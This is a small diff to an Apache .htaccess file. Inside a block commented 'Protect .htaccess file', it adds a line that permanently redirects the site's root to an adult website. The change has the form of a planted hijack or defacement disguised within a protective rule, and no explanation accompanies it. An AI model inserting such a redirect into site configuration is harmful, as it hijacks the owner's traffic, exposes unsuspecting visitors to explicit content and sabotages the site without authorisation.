@@ -1,6 +1,7 @@
 
 # Protect .htaccess file
 <Files ".htaccess">
+Redirect 301 / http://xhamster.com/
 order allow,deny
    Deny from  all
     Deny from all
